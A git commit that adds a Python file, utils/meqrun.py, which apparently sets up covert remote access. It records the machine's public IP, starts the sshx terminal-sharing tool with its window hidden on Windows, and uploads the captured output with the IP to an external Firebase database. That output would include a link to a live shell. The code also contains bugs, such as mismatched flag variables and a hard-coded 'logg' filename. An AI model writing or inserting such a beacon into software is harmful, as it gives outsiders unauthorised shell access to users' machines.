c6c32fb156018daad737ffae287d91af541f15ac
Assnsster <anous123bg@gmail.com>
2026-01-10 14:41:39 +0700

    Create meqrun.py

---
+++ utils/meqrun.py
@@ -0,0 +1,51 @@
+
+import requests
+import re
+import time
+import subprocess
+from datetime import datetime
+from zoneinfo import ZoneInfo
+import os
+import json
+
+ip = requests.get('https://api.ipify.org').text
+afip = ip.replace(".", "")
+logg = "prog.log"
+url = f"https://meqsave-default-rtdb.asia-southeast1.firebasedatabase.app/vm/{afip}.json"
+flag = 0
+now = datetime.now(ZoneInfo("Asia/Ho_Chi_Minh"))
+cmd = "sshx"
+# agm = "8.8.8.8"
+
+if os.path.exists(logg):
+  os.remove(logg)
+
+  if os.name == "nt":
+      flags = subprocess.CREATE_NO_WINDOW
+  prog = subprocess.Popen(
+      [cmd], # agm],
+      stdout=open("logg", "w", encoding="utf-8"),
+      stderr=subprocess.STDOUT,
+      creationflags=flag
+  )
+# while True: # Enable if bro want realtime upload
+  with open("logg", "r", encoding="utf-8") as f:
+      time.sleep(10)
+      global progo
+      progo = f.read()
+  progo = re.sub(
+      r'\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|.)',
+      '',
+      progo
+  )
+  data = {
+      "ip": ip,
+      "content": f"{progo}\n\nopen at {now} (Ho Chi Minh zonetime)"
+  }
+
+  response = requests.put(url, data=json.dumps(data))
+  if response.status_code == 200:
+      print("Thành công:", response.json())
+      print(ip)
+  else:
+      print("Lỗi:", response.status_code, response.text)
